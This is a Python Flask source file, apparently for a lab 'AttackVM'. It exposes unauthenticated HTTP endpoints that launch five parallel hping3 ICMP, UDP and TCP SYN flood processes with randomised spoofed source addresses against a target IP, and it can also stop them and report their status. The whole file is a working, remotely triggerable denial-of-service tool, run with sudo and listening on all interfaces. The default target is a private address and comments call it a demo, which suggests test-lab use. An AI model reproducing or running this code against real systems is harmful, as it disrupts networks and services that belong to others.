#!/usr/bin/env python3
"""
Simple Flask Attack Controller (runs on AttackVM).

- Starts/Stops hping3 attack processes
- Adds a reliable /attack/kill_all endpoint that uses `sudo pkill -9 -f hping3`
- Tracks process PIDs where possible
- Returns JSON responses and handles errors gracefully
"""
from flask import Flask, jsonify, request
import subprocess
import time
import os
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# Default target; can be overridden by environment variable or config.json if you add it
TARGET_IP = os.environ.get("TARGET_IP", "192.168.18.20")

# Track PIDs started by this controller (best-effort)
attack_procs = {
    "icmp": [],
    "udp": [],
    "tcp": []
}

HPING_CMD_TEMPLATE = {
    "icmp": ["sudo", "hping3", "--icmp", "--flood", "--rand-source", TARGET_IP],
    "udp":  ["sudo", "hping3", "--udp", "--flood", "--rand-source", "-p", "5201", TARGET_IP],
    "tcp":  ["sudo", "hping3", "-S", "--flood", "--rand-source", "-p", "5201", TARGET_IP]
}


def start_hping(cmd, count=1):
    """Start hping3 processes in background and return list of Popen objects."""
    procs = []
    for _ in range(count):
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        procs.append(proc)
    return procs


def ensure_hping_installed():
    rc = subprocess.run(["which", "hping3"], stdout=subprocess.PIPE).returncode
    return rc == 0


@app.route("/attack/<atype>/start")
def attack_start(atype):
    if atype not in HPING_CMD_TEMPLATE:
        return jsonify({"status": "error", "message": "unknown attack type"}), 400
    if not ensure_hping_installed():
        return jsonify({"status": "error", "message": "hping3 not installed"}), 500
    try:
        # start 5 parallel processes for demo
        cmd = HPING_CMD_TEMPLATE[atype]
        procs = start_hping(cmd, count=5)
        attack_procs[atype].extend([p.pid for p in procs])
        logging.info("Started %s attack PIDs: %s", atype, [p.pid for p in procs])
        return jsonify({"status": "success", "message": f"{atype} attack started", "pids": [p.pid for p in procs]})
    except Exception as e:
        logging.exception("Failed to start attack: %s", e)
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/attack/<atype>/stop")
def attack_stop(atype):
    if atype not in HPING_CMD_TEMPLATE:
        return jsonify({"status": "error", "message": "unknown attack type"}), 400
    try:
        killed = []
        # try to kill PIDs we tracked
        for pid in list(attack_procs.get(atype, [])):
            try:
                os.kill(pid, 9)
                killed.append(pid)
            except Exception:
                # ignore if already dead
                pass
        attack_procs[atype] = []
        # fallback: pkill processes of hping3 forcefully (safe for demo)
        subprocess.run(["sudo", "pkill", "-f", "hping3"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        rc = subprocess.run(["pgrep", "-f", "hping3"], stdout=subprocess.PIPE)
        remaining = rc.stdout.decode().strip().splitlines() if rc.returncode == 0 else []
        return jsonify({"status": "success", "message": f"{atype} attack stopped", "killed": killed, "remaining_hping3": remaining})
    except Exception as e:
        logging.exception("Failed to stop attack: %s", e)
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/attack/kill_all")
def attack_kill_all():
    """
    Reliable kill-all endpoint. Uses `sudo pkill -9 -f hping3`.
    Waits a short time and verifies that no hping3 processes remain.
    """
    try:
        if not ensure_hping_installed():
            return jsonify({"status": "error", "message": "hping3 not installed"}), 500
        rc_before = subprocess.run(["pgrep", "-f", "hping3"], stdout=subprocess.PIPE)
        before = rc_before.stdout.decode().strip().splitlines() if rc_before.returncode == 0 else []
        # force-kill
        subprocess.run(["sudo", "pkill", "-9", "-f", "hping3"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(0.6)
        rc_after = subprocess.run(["pgrep", "-f", "hping3"], stdout=subprocess.PIPE)
        after = rc_after.stdout.decode().strip().splitlines() if rc_after.returncode == 0 else []
        success = len(after) == 0
        # clear tracked maps
        for k in attack_procs.keys():
            attack_procs[k] = []
        return jsonify({"status": "success" if success else "partial", "killed_before": before, "remaining": after})
    except Exception as e:
        logging.exception("kill_all failed: %s", e)
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/attack/status")
def attack_status():
    rc = subprocess.run(["pgrep", "-f", "hping3"], stdout=subprocess.PIPE)
    pids = rc.stdout.decode().strip().splitlines() if rc.returncode == 0 else []
    return jsonify({"status": "ok", "hping3_pids": pids, "tracked": attack_procs})


if __name__ == "__main__":
    logging.info("Starting attack_controller on port 5002")
    app.run(host="0.0.0.0", port=5002)
